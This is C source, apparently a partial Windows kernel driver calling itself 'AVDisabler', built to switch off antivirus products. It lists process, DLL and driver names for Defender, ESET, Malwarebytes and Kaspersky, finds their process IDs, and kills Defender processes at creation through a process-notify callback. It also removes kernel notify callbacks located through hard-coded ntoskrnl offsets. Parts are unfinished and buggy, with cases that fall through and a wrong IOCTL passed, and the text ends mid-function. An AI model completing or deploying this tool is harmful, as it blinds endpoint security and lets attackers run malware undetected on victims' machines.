#include <ntddk.h>
//#include "CallbackRegistrations.h"
#include <Stdio.h>


#define DeviceType 0x8001
#define PROCESS_TERMINATE 1

#define BYTE CHAR

#define IOCTL_DISABLE_DEFENDER CTL_CODE(DeviceType, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)		
#define IOCTL_DISABLE_ESET CTL_CODE(DeviceType, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)			
#define IOCTL_DISABLE_MALWAREBYTES CTL_CODE(DeviceType, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)	

typedef enum _SYSTEM_INFORMATION_CLASS
{
	SystemBasicInformation = 0,
	SystemProcessorInformation = 1,             // obsolete...delete
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemPathInformation = 4,
	SystemProcessInformation = 5,
	SystemCallCountInformation = 6,
	SystemDeviceInformation = 7,
	SystemProcessorPerformanceInformation = 8,
	SystemFlagsInformation = 9,
	SystemCallTimeInformation = 10,
	SystemModuleInformation = 11,
	SystemLocksInformation = 12,
	SystemStackTraceInformation = 13,
	SystemPagedPoolInformation = 14,
	SystemNonPagedPoolInformation = 15,
	SystemHandleInformation = 16,
	SystemObjectInformation = 17,
	SystemPageFileInformation = 18,
	SystemVdmInstemulInformation = 19,
	SystemVdmBopInformation = 20,
	SystemFileCacheInformation = 21,
	SystemPoolTagInformation = 22,
	SystemInterruptInformation = 23,
	SystemDpcBehaviorInformation = 24,
	SystemFullMemoryInformation = 25,
	SystemLoadGdiDriverInformation = 26,
	SystemUnloadGdiDriverInformation = 27,
	SystemTimeAdjustmentInformation = 28,
	SystemSummaryMemoryInformation = 29,
	SystemMirrorMemoryInformation = 30,
	SystemPerformanceTraceInformation = 31,
	SystemObsolete0 = 32,
	SystemExceptionInformation = 33,
	SystemCrashDumpStateInformation = 34,
	SystemKernelDebuggerInformation = 35,
	SystemContextSwitchInformation = 36,
	SystemRegistryQuotaInformation = 37,
	SystemExtendServiceTableInformation = 38,
	SystemPrioritySeperation = 39,
	SystemVerifierAddDriverInformation = 40,
	SystemVerifierRemoveDriverInformation = 41,
	SystemProcessorIdleInformation = 42,
	SystemLegacyDriverInformation = 43,
	SystemCurrentTimeZoneInformation = 44,
	SystemLookasideInformation = 45,
	SystemTimeSlipNotification = 46,
	SystemSessionCreate = 47,
	SystemSessionDetach = 48,
	SystemSessionInformation = 49,
	SystemRangeStartInformation = 50,
	SystemVerifierInformation = 51,
	SystemVerifierThunkExtend = 52,
	SystemSessionProcessInformation = 53,
	SystemLoadGdiDriverInSystemSpace = 54,
	SystemNumaProcessorMap = 55,
	SystemPrefetcherInformation = 56,
	SystemExtendedProcessInformation = 57,
	SystemRecommendedSharedDataAlignment = 58,
	SystemComPlusPackage = 59,
	SystemNumaAvailableMemory = 60,
	SystemProcessorPowerInformation = 61,
	SystemEmulationBasicInformation = 62,
	SystemEmulationProcessorInformation = 63,
	SystemExtendedHandleInformation = 64,
	SystemLostDelayedWriteInformation = 65,
	SystemBigPoolInformation = 66,
	SystemSessionPoolTagInformation = 67,
	SystemSessionMappedViewInformation = 68,
	SystemHotpatchInformation = 69,
	SystemObjectSecurityMode = 70,
	SystemWatchdogTimerHandler = 71,
	SystemWatchdogTimerInformation = 72,
	SystemLogicalProcessorInformation = 73,
	SystemWow64SharedInformation = 74,
	SystemRegisterFirmwareTableInformationHandler = 75,
	SystemFirmwareTableInformation = 76,
	SystemModuleInformationEx = 77,
	SystemVerifierTriageInformation = 78,
	SystemSuperfetchInformation = 79,
	SystemMemoryListInformation = 80,
	SystemFileCacheInformationEx = 81,
	MaxSystemInfoClass = 82  // MaxSystemInfoClass should always be the last enum

} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_PROCESS_INFORMATION {
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	LARGE_INTEGER Reserved[3];
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ImageName;
	ULONG BasePriority;
	HANDLE UniqueProcessId;
	HANDLE InheritedFromUniqueProcessId;
	ULONG HandleCount;
	ULONG SessionId;
	ULONG_PTR PageDirectoryBase;
	SIZE_T PeakVirtualSize;
	SIZE_T VirtualSize;
	ULONG PageFaultCount;
	SIZE_T PeakWorkingSetSize;
	SIZE_T WorkingSetSize;
	SIZE_T QuotaPeakPagedPoolUsage;
	SIZE_T QuotaPagedPoolUsage;
	SIZE_T QuotaPeakNonPagedPoolUsage;
	SIZE_T QuotaNonPagedPoolUsage;
	SIZE_T PagefileUsage;
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER ReadOperationCount;
	LARGE_INTEGER WriteOperationCount;
	LARGE_INTEGER OtherOperationCount;
	LARGE_INTEGER ReadTransferCount;
	LARGE_INTEGER WriteTransferCount;
	LARGE_INTEGER OtherTransferCount;
	// Followed by an array of SYSTEM_THREAD_INFORMATION structures
} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;


#define SystemProcessInformationSize 1024 * 1024 * 2
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004

BYTE PspEnumerateCallbackOpcodes[] = { 0x4C, 0x8B, 0xCA, 0x85, 0xC9, 0x74, 0x35, 0x83, 0xE9, 0x01 }; // first 10 opcodes

//TODO: Add an initial process termination functiona that will be called at the start of each process creation callback routine 
//	on each UNICODE_STRING image related to the AV Vendor (Defender, ESET, Malwarebytes) etc...

ULONG_PTR PspCreateProcessCallbackRoutine = 0;
ULONG_PTR PspCreateThreadCallbackRoutine = 0;
ULONG_PTR PspLoadImageCallbackRoutine = 0;

ULONG PIDs[256]; // Used in GetAVPIDs()
int NumberOfProcesses = 0;

DWORD32 PspCreateThreadCallbackRoutineCount = 0;
DWORD32 PspCreateProcessCallbackRoutineCount = 0;
DWORD32 PspLoadImageCallbackRoutineCount = 0;

typedef NTSTATUS(NTAPI* fObOpenObjectByPointer)(
	PVOID Object,
	ULONG HandleAttributes,
	PACCESS_STATE PassedAccessState,
	ACCESS_MASK DesiredAccess,
	POBJECT_TYPE ObjectType,
	KPROCESSOR_MODE AccessMode,
	PHANDLE Handle);

/*----------------Processes----------------*/

// Defender Processes
UNICODE_STRING DefenderMsMpEng = RTL_CONSTANT_STRING(L"MsMpEng.exe");
UNICODE_STRING DefenderSecurityHealthService = RTL_CONSTANT_STRING(L"SecurityHealthService.exe");
UNICODE_STRING DefenderSecurityHealthSystray = RTL_CONSTANT_STRING(L"SecurityHealthSystray.exe");
UNICODE_STRING DefenderSecurityHealthHost = RTL_CONSTANT_STRING(L"SecurityHealthHost.exe");
UNICODE_STRING DefenderSecHealthUI = RTL_CONSTANT_STRING(L"SecHealthUI.exe");

// Malwarebytes Processes
UNICODE_STRING MalwarebytesEXE = RTL_CONSTANT_STRING(L"Malwarebytes.exe");
UNICODE_STRING MBAMServiceEXE = RTL_CONSTANT_STRING(L"MBAMService.exe");

// Eset Processes
UNICODE_STRING CallmsiEXE = RTL_CONSTANT_STRING(L"callmsi.exe");
UNICODE_STRING eCaptureEXE = RTL_CONSTANT_STRING(L"eCapture.exe");
UNICODE_STRING eclsEXE = RTL_CONSTANT_STRING(L"ecls.exe");
UNICODE_STRING ecmdEXE = RTL_CONSTANT_STRING(L"ecmd.exe");
UNICODE_STRING ecmdsEXE = RTL_CONSTANT_STRING(L"ecmds.exe");
UNICODE_STRING eeclntEXE = RTL_CONSTANT_STRING(L"eeclnt.exe");
UNICODE_STRING eguiEXE = RTL_CONSTANT_STRING(L"egui.exe");
UNICODE_STRING eguiProxyEXE = RTL_CONSTANT_STRING(L"eguiProxy.exe");

// Kaspersky Processes
UNICODE_STRING avpEXE = RTL_CONSTANT_STRING(L"avp.exe");
UNICODE_STRING avpuiEXE = RTL_CONSTANT_STRING(L"avpui.exe");
UNICODE_STRING avpiaEXE = RTL_CONSTANT_STRING(L"avpia.exe");

/*----------------Processes----------------*/

/*-----------------Images------------------*/

// Defender Images


// Malwarebytes Images

UNICODE_STRING mbaeDLL = RTL_CONSTANT_STRING(L"mbae.dll");
UNICODE_STRING mbae64DLL = RTL_CONSTANT_STRING(L"mbae64.dll");
UNICODE_STRING MBAMCoreDLL = RTL_CONSTANT_STRING(L"MBAMCore.dll");
UNICODE_STRING MBAMShimDLL = RTL_CONSTANT_STRING(L"MBAMShim.dll");
UNICODE_STRING mmbamsi32DLL = RTL_CONSTANT_STRING(L"mmbamsi32.dll");
UNICODE_STRING mbamsi64DLL = RTL_CONSTANT_STRING(L"mbamsi64.dll");
UNICODE_STRING mbamsisdkDLL = RTL_CONSTANT_STRING(L"mbamsisdk.dll");

// Eset Images

UNICODE_STRING eamsiDLL = RTL_CONSTANT_STRING(L"eamsi.dll");
UNICODE_STRING ebehmoniDLL = RTL_CONSTANT_STRING(L"ebehmoni.dll");
UNICODE_STRING eebehmonlDLL = RTL_CONSTANT_STRING(L"eebehmonl.dll");
UNICODE_STRING eclsLangDLL = RTL_CONSTANT_STRING(L"eclsLang.dll");
UNICODE_STRING edbDLL = RTL_CONSTANT_STRING(L"edb.dll");


// Kaspersky Images

UNICODE_STRING am_coreDLL = RTL_CONSTANT_STRING(L"am_core.dll");
UNICODE_STRING amsi_taskDLL = RTL_CONSTANT_STRING(L"amsi_task.dll");
UNICODE_STRING am_win_auxDLL = RTL_CONSTANT_STRING(L"am_win_aux.dll");
UNICODE_STRING am_patch_managementDLL = RTL_CONSTANT_STRING(L"am_patch_management.dll");
UNICODE_STRING system_interceptorsDLL = RTL_CONSTANT_STRING(L"system_interceptors.dll");
UNICODE_STRING system_interceptors_metaDLL = RTL_CONSTANT_STRING(L"system_interceptors_meta.dll");


/*-----------------Images------------------*/


/*-----------------Drivers-----------------*/


// Defender Drivers


// Malwarebytes Drivers

UNICODE_STRING mbae64SYS = RTL_CONSTANT_STRING(L"mbae64.sys");
UNICODE_STRING mbamelamSYS = RTL_CONSTANT_STRING(L"mbamelam.sys");


// Eset Drivers

UNICODE_STRING eamonmSYS = RTL_CONSTANT_STRING(L"eamonm.sys");
UNICODE_STRING edevmonSYS = RTL_CONSTANT_STRING(L"edevmon.sys");
UNICODE_STRING edevmonmSYS = RTL_CONSTANT_STRING(L"edevmonm.sys");
UNICODE_STRING eelamSYS = RTL_CONSTANT_STRING(L"eelam.sys");
UNICODE_STRING ehdrvSYS = RTL_CONSTANT_STRING(L"ehdrv.sys");
UNICODE_STRING ekbdfltSYS = RTL_CONSTANT_STRING(L"ekbdflt.sys"); // unload using FltUnloadFilter()
UNICODE_STRING epfwSYS = RTL_CONSTANT_STRING(L"epfw.sys");
UNICODE_STRING EpfwLwfSYS = RTL_CONSTANT_STRING(L"EpfwLwf.sys");
UNICODE_STRING EpfwWfpSYS = RTL_CONSTANT_STRING(L"EpfwWfp.sys");

// Kaspersky Drivers

UNICODE_STRING klim6SYS = RTL_CONSTANT_STRING(L"klim6.sys");
UNICODE_STRING klfltSYS = RTL_CONSTANT_STRING(L"klflt.sys");				// unload using FltUnloadFilter()
UNICODE_STRING klelamSYS = RTL_CONSTANT_STRING(L"klelam.sys");
UNICODE_STRING klbackupdiskSYS = RTL_CONSTANT_STRING(L"klbackupdisk.sys");
UNICODE_STRING klbackupfltSYS = RTL_CONSTANT_STRING(L"klbackupflt.sys");	// unload using FltUnloadFilter()
UNICODE_STRING kldiskSYS = RTL_CONSTANT_STRING(L"kldisk.sys");
UNICODE_STRING klkbdfltSYS = RTL_CONSTANT_STRING(L"klkbdflt.sys");			// unload using FltUnloadFilter()
UNICODE_STRING klmoufltSYS = RTL_CONSTANT_STRING(L"klmouflt.sys");			// unload using FltUnloadFilter()
UNICODE_STRING klpdSYS = RTL_CONSTANT_STRING(L"klpd.sys");
UNICODE_STRING klpnpfltSYS = RTL_CONSTANT_STRING(L"klpnpflt.sys");			// unload using FltUnloadFilter()
UNICODE_STRING klwtpSYS = RTL_CONSTANT_STRING(L"klwtp.sys");
UNICODE_STRING knepsSYS = RTL_CONSTANT_STRING(L"kneps.sys");

/*-----------------Drivers-----------------*/

BOOLEAN g_IsDefenderCallbackRoutineSet = FALSE;
BOOLEAN g_IsEsetCallbackRoutineSet = FALSE;
BOOLEAN g_IsMalwareBytesCallbackRoutineSet = FALSE;

NTSTATUS GetFileNameFromPath(IN UNICODE_STRING FullPath, OUT UNICODE_STRING* FileName)
{
	// Check for valid input parameters
	if (FullPath.Buffer == NULL || FileName == NULL)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Special case handling for "C:\" or similar paths
	if (FullPath.Length == 4 && FullPath.Buffer[0] == L'C' && FullPath.Buffer[1] == L':' && FullPath.Buffer[2] == L'\\')
	{
		// For "C:\", consider it as the root, so no file name
		FileName->Buffer = FullPath.Buffer + 3;  // Skip the "C:\"
		FileName->Length = 0;                    // No file name after the backslash
		FileName->MaximumLength = FullPath.MaximumLength;
		return STATUS_SUCCESS;
	}

	// Start from the end of the FullPath string
	PWSTR pBackslash = NULL;
	for (PWSTR p = FullPath.Buffer + FullPath.Length / sizeof(WCHAR) - 1; p >= FullPath.Buffer; p--)
	{
		if (*p == L'\\') // Found the last backslash
		{
			pBackslash = p;
			break;
		}
	}

	if (pBackslash == NULL)
	{
		// No backslash found, so the whole path is the filename
		FileName->Buffer = FullPath.Buffer;
		FileName->Length = FullPath.Length;
		FileName->MaximumLength = FullPath.MaximumLength;
	}
	else
	{
		// Set FileName to point after the last backslash
		FileName->Buffer = pBackslash + 1;
		FileName->Length = (USHORT)((FullPath.Buffer + FullPath.Length / sizeof(WCHAR) - 1) - pBackslash) * sizeof(WCHAR);
		FileName->MaximumLength = FileName->Length + sizeof(WCHAR);  // Plus the null terminator
	}

	return STATUS_SUCCESS;
}

NTSTATUS GetAVPIDs(DWORD32 IOCTL)
{
	/*
		Need to verify in DriverEntry() that the PIDs are received successfully
	*/

	typedef NTSTATUS(NTAPI* fNtQuerySystemInformation)(
		SYSTEM_INFORMATION_CLASS SystemInformationClass,
		PVOID                    SystemInformation,
		ULONG                    SystemInformationLength,
		PULONG                   ReturnLength);

	ULONG len = 0;
	SYSTEM_PROCESS_INFORMATION* ProcessInformation;
	SYSTEM_PROCESS_INFORMATION* ProcessInfoIter;

	NTSTATUS status = STATUS_SUCCESS;
	UNICODE_STRING NtQuerySystemInformationName = RTL_CONSTANT_STRING(L"NtQuerySystemInformation");
	fNtQuerySystemInformation NtQuerySystemInformation = (fNtQuerySystemInformation)MmGetSystemRoutineAddress(&NtQuerySystemInformationName);
	KdPrint(("[+] AVDisabler:: NtQuerySystemInformation() address: 0x%p\n", NtQuerySystemInformation));

	switch (IOCTL)
	{
	case IOCTL_DISABLE_DEFENDER:
	{
		ProcessInformation = (SYSTEM_PROCESS_INFORMATION*)ExAllocatePool(NonPagedPool, SystemProcessInformationSize);
		if (status == STATUS_INFO_LENGTH_MISMATCH)
			status = NtQuerySystemInformation(SystemProcessInformation, ProcessInformation, len, &len);

		ProcessInfoIter = ProcessInformation;
		while (ProcessInfoIter->NextEntryOffset)
		{
			ProcessInfoIter = (SYSTEM_PROCESS_INFORMATION*)((CHAR*)ProcessInfoIter + ProcessInfoIter->NextEntryOffset);
			if (wcscmp(ProcessInfoIter->ImageName.Buffer, DefenderSecurityHealthService.Buffer) == 0 ||
				wcscmp(ProcessInfoIter->ImageName.Buffer, DefenderSecurityHealthSystray.Buffer) == 0 ||
				wcscmp(ProcessInfoIter->ImageName.Buffer, DefenderSecurityHealthHost.Buffer) == 0 ||
				wcscmp(ProcessInfoIter->ImageName.Buffer, DefenderSecHealthUI.Buffer) == 0 ||
				wcscmp(ProcessInfoIter->ImageName.Buffer, DefenderMsMpEng.Buffer) == 0)
			{
				PIDs[NumberOfProcesses] = HandleToUlong(ProcessInfoIter->UniqueProcessId);
				NumberOfProcesses++;
				KdPrint(("[+] AVDisabler::GetAVPIDs Defender: Found %wZ | PID : %d\n", &ProcessInfoIter->ImageName, ProcessInfoIter->UniqueProcessId));
			}
		}

		ExFreePool(ProcessInformation);
		return status;
	}

	case IOCTL_DISABLE_ESET:
	{
		ProcessInformation = (SYSTEM_PROCESS_INFORMATION*)ExAllocatePool(NonPagedPool, SystemProcessInformationSize);
		if (status == STATUS_INFO_LENGTH_MISMATCH)
			status = NtQuerySystemInformation(SystemProcessInformation, ProcessInformation, len, &len);

		ProcessInfoIter = ProcessInformation;
		while (ProcessInfoIter->NextEntryOffset)
		{
			ProcessInfoIter = (SYSTEM_PROCESS_INFORMATION*)((CHAR*)ProcessInfoIter + ProcessInfoIter->NextEntryOffset);
			if (wcscmp(ProcessInfoIter->ImageName.Buffer, CallmsiEXE.Buffer) == 0 ||
				wcscmp(ProcessInfoIter->ImageName.Buffer, eCaptureEXE.Buffer) == 0 ||
				wcscmp(ProcessInfoIter->ImageName.Buffer, eclsEXE.Buffer) == 0 ||
				wcscmp(ProcessInfoIter->ImageName.Buffer, ecmdEXE.Buffer) == 0 ||
				wcscmp(ProcessInfoIter->ImageName.Buffer, ecmdsEXE.Buffer) == 0 ||
				wcscmp(ProcessInfoIter->ImageName.Buffer, eeclntEXE.Buffer) == 0 ||
				wcscmp(ProcessInfoIter->ImageName.Buffer, eguiEXE.Buffer) == 0 ||
				wcscmp(ProcessInfoIter->ImageName.Buffer, eguiProxyEXE.Buffer) == 0)
			{
				PIDs[NumberOfProcesses] = HandleToUlong(ProcessInfoIter->UniqueProcessId);
				NumberOfProcesses++;
				KdPrint(("[+] AVDisabler::GetAVPIDs ESET: Found %wZ | PID : %d\n", &ProcessInfoIter->ImageName, ProcessInfoIter->UniqueProcessId));
			}
		}

		ExFreePool(ProcessInformation);
		return status;
	}

	case IOCTL_DISABLE_MALWAREBYTES:
	{
		ProcessInformation = (SYSTEM_PROCESS_INFORMATION*)ExAllocatePool(NonPagedPool, SystemProcessInformationSize);
		if (status == STATUS_INFO_LENGTH_MISMATCH)
			status = NtQuerySystemInformation(SystemProcessInformation, ProcessInformation, len, &len);

		ProcessInfoIter = ProcessInformation;
		while (ProcessInfoIter->NextEntryOffset)
		{
			ProcessInfoIter = (SYSTEM_PROCESS_INFORMATION*)((CHAR*)ProcessInfoIter + ProcessInfoIter->NextEntryOffset);
			if (wcscmp(ProcessInfoIter->ImageName.Buffer, MalwarebytesEXE.Buffer) == 0 ||
				wcscmp(ProcessInfoIter->ImageName.Buffer, MBAMServiceEXE.Buffer) == 0)
			{
				PIDs[NumberOfProcesses] = HandleToUlong(ProcessInfoIter->UniqueProcessId);
				NumberOfProcesses++;
				KdPrint(("[+] AVDisabler::GetAVPIDs Malwarebytes: Found %wZ | PID : %d\n", &ProcessInfoIter->ImageName, ProcessInfoIter->UniqueProcessId));
			}
		}

		ExFreePool(ProcessInformation);
		return status;
	}
	}
	return status;
}

NTSTATUS TerminateAVProcesses(DWORD32 IOCTL)
{
	typedef NTSTATUS(NTAPI* fPsLookupProcessByProcessId)(
		HANDLE ProcessId,
		PEPROCESS* Process);

	typedef NTSTATUS(NTAPI* fObOpenObjectByPointer)(
		PVOID           Object,
		ULONG           HandleAttributes,
		PACCESS_STATE   PassedAccessState,
		ACCESS_MASK     DesiredAccess,
		POBJECT_TYPE    ObjectType,
		KPROCESSOR_MODE AccessMode,
		PHANDLE         Handle
		);

	int counter = 0;
	NTSTATUS status = STATUS_SUCCESS;

	UNICODE_STRING PsLookupProcessByProcessIdName = RTL_CONSTANT_STRING(L"PsLookupProcessByProcessId");
	fPsLookupProcessByProcessId PsLookupProcessByProcessId = (fPsLookupProcessByProcessId)MmGetSystemRoutineAddress(&PsLookupProcessByProcessIdName);

	UNICODE_STRING ObOpenObjectByPointerName = RTL_CONSTANT_STRING(L"ObOpenObjectByPointer");
	fObOpenObjectByPointer ObOpenObjectByPointer = (fObOpenObjectByPointer)MmGetSystemRoutineAddress(&ObOpenObjectByPointerName);
	PEPROCESS* PEprocess = 0;
	switch (IOCTL)
	{
	case IOCTL_DISABLE_ESET:
	{
		GetAVPIDs(IOCTL_DISABLE_ESET);
		for (int i = 0; i < NumberOfProcesses; i++)
		{
			status = PsLookupProcessByProcessId(UlongToHandle(PIDs[i]), PEprocess);
			if (!NT_SUCCESS(status))
			{
				KdPrint(("[-] AVDisabler::TerminateAVProcess: PsLookupProcessByProcessId FAILED: 0x%x\n", status));
				continue;
			}

			KdPrint(("[-] AVDisabler::TerminateAVProcess: IOCTL_DISABLE_ESET: 0x%p\n", *PEprocess));

			//ObOpenObjectByPointer() // Need to complete
			//ZwTerminateProcess()	// Need to complete
		}
	}

	case IOCTL_DISABLE_MALWAREBYTES:
	{
		GetAVPIDs(IOCTL_DISABLE_MALWAREBYTES);
		for (int i = 0; i < NumberOfProcesses; i++)
		{
			status = PsLookupProcessByProcessId(UlongToHandle(PIDs[i]), PEprocess);
			if (!NT_SUCCESS(status))
			{
				KdPrint(("[-] AVDisabler::TerminateAVProcess: PsLookupProcessByProcessId FAILED: 0x%x\n", status));
				continue;
			}

			KdPrint(("[-] AVDisabler::TerminateAVProcess: IOCTL_DISABLE_ESET: 0x%p\n", *PEprocess));

			//ObOpenObjectByPointer() // Need to complete
			//ZwTerminateProcess()	// Need to complete
		}
	}

	case IOCTL_DISABLE_DEFENDER:
	{
		GetAVPIDs(IOCTL_DISABLE_MALWAREBYTES);
		for (int i = 0; i < NumberOfProcesses; i++)
		{
			status = PsLookupProcessByProcessId(UlongToHandle(PIDs[i]), PEprocess);
			if (!NT_SUCCESS(status))
			{
				KdPrint(("[-] AVDisabler::TerminateAVProcess: PsLookupProcessByProcessId FAILED: 0x%x\n", status));
				continue;
			}

			KdPrint(("[-] AVDisabler::TerminateAVProcess: IOCTL_DISABLE_ESET: 0x%p\n", *PEprocess));

			//ObOpenObjectByPointer() // Need to complete
			//ZwTerminateProcess()	// Need to complete
		}
	}
	}

	return status;
}

void PreventDefenderProcessCreate(PEPROCESS Process,
								  HANDLE ProcessId,
								  PPS_CREATE_NOTIFY_INFO CreateInfo)
{
	if (CreateInfo) {
		NTSTATUS status = STATUS_SUCCESS;
		HANDLE hProcess = nullptr;

		UNICODE_STRING ObOpenObjectByPointerFuncName = RTL_CONSTANT_STRING(L"ObOpenObjectByPointer");
		fObOpenObjectByPointer ObOpenObjectByPointer = (fObOpenObjectByPointer)MmGetSystemRoutineAddress(&ObOpenObjectByPointerFuncName);
		KdPrint(("[+]AVDisablerDriver::PreventDefenderProcessCreate: ObGetObjectByPointer address: 0x%p\n", ObOpenObjectByPointer));

		UNICODE_STRING ImageFileName;
		status = GetFileNameFromPath(*CreateInfo->ImageFileName, &ImageFileName);
		if (!NT_SUCCESS(status))
		{
			KdPrint(("[-] AVDisabler::DriverEntry:GetFileNameFromPath was failed with NTSTATUS 0x%x\n", status));
			return;
		}
		// checking if the process being created is one of defender's processes
		if (RtlCompareUnicodeString(&ImageFileName, &DefenderMsMpEng, TRUE) == 0 ||
			RtlCompareUnicodeString(&ImageFileName, &DefenderSecurityHealthService, TRUE) == 0 ||
			RtlCompareUnicodeString(&ImageFileName, &DefenderSecurityHealthSystray, TRUE) == 0 ||
			RtlCompareUnicodeString(&ImageFileName, &DefenderSecurityHealthHost, TRUE) == 0 ||
			RtlCompareUnicodeString(&ImageFileName, &DefenderSecHealthUI, TRUE) == 0)
		{
			status = ObOpenObjectByPointer(Process, OBJ_KERNEL_HANDLE, nullptr, GENERIC_ALL, *PsProcessType, KernelMode, &hProcess);
			if (!NT_SUCCESS(status))
			{
				KdPrint(("[-] AVDisabler::PreventDefenderProcessCreate: Can't open handle to process. (NTSTATUS: 0x%x)\n", status));
				return;
			}

			KdPrint(("[+] AVDisabler::PreventDefenderProcessCreate: handle to %wZ was opened successfully!!\n", CreateInfo->ImageFileName));
			status = ZwTerminateProcess(hProcess, STATUS_ACCESS_VIOLATION); //Check if there is a need to ObDerefernceObject() the PEPROCESS to avoid memory leak
			if (!NT_SUCCESS(status))
			{
				KdPrint(("[-] AVDisabler::PreventDefenderProcessCreate: Can't terminate process (NTSTATUS: 0x%x)\n", status));
				//ObCloseHandle(hProcess, 0);  <-- Might not be necessary
				return;
			}

			KdPrint(("[+] AVDisabler::PreventDefenderProcessCreate: process %d of %wZ was terminated successfully!!\n", HandleToUlong(ProcessId), CreateInfo->ImageFileName));

		}
	}
}

VOID GetPspEnumerateCallbackBaseAddress(ULONG_PTR* PspEnumerateCallbackBaseAddress)
{
	/*
		Need here to implement a function that reads the whole content of ntoskrnl.exe into a memory buffer
		Then, compare every 10 opcodes with the PspEnumerateCallback opcodes, whenever there is a match,
		return the base address/offset from base address into PspEnumerateCallbackBaseAddress
	*/

	return;
}

NTSTATUS TerminateCallbackRoutines(ULONG_PTR* PspCreateProcessCallbackRoutinesArray,
	ULONG_PTR* PspCreateThreadCallbackRoutinesArray,
	ULONG_PTR* PspLoadImageCallbackRoutinesArray)
{
	NTSTATUS status = STATUS_SUCCESS;
	if (PspCreateThreadCallbackRoutineCount)
	{
		for (int i = 0; i < PspCreateThreadCallbackRoutineCount; i++)
		{
			status = PsSetCreateProcessNotifyRoutine((PCREATE_PROCESS_NOTIFY_ROUTINE)PspCreateThreadCallbackRoutinesArray[i], TRUE);
			if (!NT_SUCCESS(status))
			{
				KdPrint(("[-] AVDisabler::TerminateCallbackRoutines: Error terminating 0x%p thread callback routine NTSTATUS: 0x%x\n", PspCreateThreadCallbackRoutinesArray[i], status));
				continue;
			}

			KdPrint(("[+] AVDisabler::TerminateCallbackRoutines: Removed 0x%p thread callback routine successfully!\n", PspCreateThreadCallbackRoutinesArray[i]));
		}
	}

	if (PspCreateProcessCallbackRoutineCount)
	{
		for (int i = 0; i < PspCreateProcessCallbackRoutineCount; i++)
		{
			status = PsSetCreateProcessNotifyRoutine((PCREATE_PROCESS_NOTIFY_ROUTINE)PspCreateProcessCallbackRoutinesArray[i], TRUE);
			if (!NT_SUCCESS(status))
			{
				KdPrint(("[-] AVDisabler::TerminateCallbackRoutines: Error terminating 0x%p process callback routine NTSTATUS: 0x%x\n", PspCreateProcessCallbackRoutinesArray[i], status));
				continue;
				//return status;
			}

			KdPrint(("[+] AVDisabler::TerminateCallbackRoutines: Removed 0x%p process callback routine successfully!\n", PspCreateProcessCallbackRoutinesArray[i]));
		}
	}

	if (PspLoadImageCallbackRoutineCount)
	{
		for (int i = 0; i < PspLoadImageCallbackRoutineCount; i++)
		{
			status = PsSetCreateProcessNotifyRoutine((PCREATE_PROCESS_NOTIFY_ROUTINE)PspLoadImageCallbackRoutinesArray[i], TRUE);
			if (!NT_SUCCESS(status))
			{
				KdPrint(("[-] AVDisabler::TerminateCallbackRoutines: Error terminating 0x%p load image callback routine NTSTATUS: 0x%x\n", PspLoadImageCallbackRoutinesArray[i], status));
				//return status;
				continue;
			}

			KdPrint(("[+] AVDisabler::TerminateCallbackRoutines: Removed 0x%p load image callback routine successfully!\n", PspLoadImageCallbackRoutinesArray[i]));
		}
	}

	return status;
}

NTSTATUS EnumerateAVCallbackRoutinesBaseAddress(ULONG_PTR* PspCreateProcessNotifyRoutine,
	ULONG_PTR* PspCreateThreadNotifyRoutine,
	ULONG_PTR* PspLoadImageNotifyRoutine)
{
	/*
		----Needs to be tested!!!---

		PspEnumerateCallback needs to be resolved differently!!!
	*/

	NTSTATUS status = STATUS_SUCCESS;
	typedef int(NTAPI* pPspEnumerateCallback)(
		int ObjectTypeRoutineArrayIndex,
		DWORD32* PCallbackIndex,
		ULONG_PTR* TargetRoutineBaseAddress);

	UNICODE_STRING PspEnumerateCallbackName = RTL_CONSTANT_STRING(L"PspEnumerateCallback");
	UNICODE_STRING ExAllocatePoolName = RTL_CONSTANT_STRING(L"ExAllocatePool");

	ULONG_PTR ExAllocatePoolAddress = (ULONG_PTR)MmGetSystemRoutineAddress(&ExAllocatePoolName);
	KdPrint(("[+] AVDisabler::EnumerateAVCallbackRoutinesBaseAddress: ExAllocatePool: 0x%p\n", ExAllocatePoolAddress));

	PVOID NtosKernelBaseAddress = (PVOID)(ExAllocatePoolAddress - 0x3F46C0);
	KdPrint(("[+] AVDisabler::EnumerateAVCallbackRoutinesBaseAddress: ntoskrnl.exe base address: 0x%p\n", NtosKernelBaseAddress));

	pPspEnumerateCallback PspEnumerateCallback = (pPspEnumerateCallback)((ULONG_PTR)NtosKernelBaseAddress + 0xA3F930);
	if (!PspEnumerateCallback)
	{
		KdPrint(("[-] AVDisabler::EnumerateAVCallbackRoutinesBaseAddress: Couldn't resolve PspEnumerateCallback address\n"));
		status = STATUS_INVALID_ADDRESS;
		return status;
	}

	KdPrint(("[*] AVDisabler::EnumerateAVCallbackRoutinesBaseAddress: PspEnumerateCallback address at: 0x%p\n", PspEnumerateCallback));

	DWORD32 CallbackIndex = 0;
	//DWORD32 CallbackIndex = 1; // Process type
	PspEnumerateCallback(1, &CallbackIndex, PspCreateProcessNotifyRoutine);
	if (!(*PspCreateProcessNotifyRoutine))
	{
		KdPrint(("[-] AVDisabler::EnumerateAVCallbackRoutinesBaseAddress: PspCreateProcessNotifyRoutine address is 0x0,\neither there is no process creation callback routines or there is a bug\n"));
		status = STATUS_INVALID_ADDRESS;
		return status;
	}
	KdPrint(("[+] AVDisabler::EnumerateAVCallbackRoutinesBaseAddress: Base Address of PspCreateProcessNotifyRoutine: 0x%p\n", *PspCreateProcessNotifyRoutine));

	//CallbackIndex = 0; // Thread type
	CallbackIndex = 0;
	PspEnumerateCallback(0, &CallbackIndex, PspCreateThreadNotifyRoutine);
	if (!(*PspCreateThreadNotifyRoutine))
	{
		KdPrint(("[-] AVDisabler::EnumerateAVCallbackRoutinesBaseAddress: PspCreateThreadNotifyRoutine address is 0x0,\neither there is no thread creation callback routines or there is a bug\n"));
		status = STATUS_INVALID_ADDRESS;
		return status;
	}

